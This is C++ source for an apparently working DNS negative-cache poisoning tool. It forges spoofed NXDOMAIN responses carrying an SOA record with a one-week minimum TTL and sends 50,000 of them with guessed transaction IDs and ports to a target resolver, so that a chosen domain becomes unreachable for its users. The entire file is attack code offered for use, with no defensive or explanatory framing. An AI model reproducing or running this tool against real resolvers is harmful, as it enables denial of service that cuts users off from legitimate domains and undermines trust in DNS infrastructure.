// Compile: g++ -o nxdomain_poison nxdomain_poison.cpp
// Run: sudo ./nxdomain_poison <target_dns> <domain_to_block>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>

class NXDomainPoison {
private:
    std::string targetDNS, blockDomain;
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    NXDomainPoison(const std::string& dns, const std::string& domain)
        : targetDNS(dns), blockDomain(domain) {}
    
    // Poison negative cache - makes domain unavailable for TTL duration
    // Uses SOA record in authority section to set negative cache TTL
    void poisonNX(uint16_t txid, uint16_t dstPort) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        char packet[512];
        memset(packet, 0, sizeof(packet));
        
        struct iphdr* ip = (struct iphdr*)packet;
        struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
        char* dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        
        *(uint16_t*)(dns + 0) = htons(txid);
        // Response + AA + NXDOMAIN (rcode 3)
        *(uint16_t*)(dns + 2) = htons(0x8403);
        *(uint16_t*)(dns + 4) = htons(1);  // QDCOUNT
        *(uint16_t*)(dns + 6) = htons(0);  // ANCOUNT
        *(uint16_t*)(dns + 8) = htons(1);  // NSCOUNT (SOA in authority)
        *(uint16_t*)(dns + 10) = htons(0); // ARCOUNT
        
        int pos = 12;
        
        // Question
        pos += encodeName(dns + pos, blockDomain);
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        
        // Authority: SOA record with long minimum TTL for negative caching
        pos += encodeName(dns + pos, blockDomain);
        *(uint16_t*)(dns + pos) = htons(6); pos += 2;  // SOA
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;  // IN
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;  // TTL
        
        int soaLenPos = pos;
        pos += 2;  // RDLENGTH placeholder
        int soaStart = pos;
        
        // SOA MNAME
        pos += encodeName(dns + pos, "ns." + blockDomain);
        // SOA RNAME
        pos += encodeName(dns + pos, "admin." + blockDomain);
        // SOA Serial, Refresh, Retry, Expire
        *(uint32_t*)(dns + pos) = htonl(1); pos += 4;
        *(uint32_t*)(dns + pos) = htonl(3600); pos += 4;
        *(uint32_t*)(dns + pos) = htonl(600); pos += 4;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        // SOA Minimum TTL - controls negative cache duration!
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;  // 1 week!
        
        *(uint16_t*)(dns + soaLenPos) = htons(pos - soaStart);
        
        udp->source = htons(53);
        udp->dest = htons(dstPort);
        udp->len = htons(sizeof(struct udphdr) + pos);
        udp->check = 0;
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        ip->saddr = inet_addr(targetDNS.c_str());
        ip->daddr = inet_addr(targetDNS.c_str());
        ip->check = 0;
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(dstPort);
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    void run(int attempts) {
        std::cout << "[*] NXDOMAIN negative cache poisoning\n";
        std::cout << "[*] Target: " << blockDomain << " (blocked for 1 week)\n";
        
        for (int i = 0; i < attempts; i++) {
            uint16_t txid = rand() & 0xFFFF;
            uint16_t port = 1024 + (rand() % 64000);
            poisonNX(txid, port);
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <dns> <domain_to_block>\n";
        return 1;
    }
    srand(time(NULL));
    NXDomainPoison poison(argv[1], argv[2]);
    poison.run(50000);
    return 0;
}
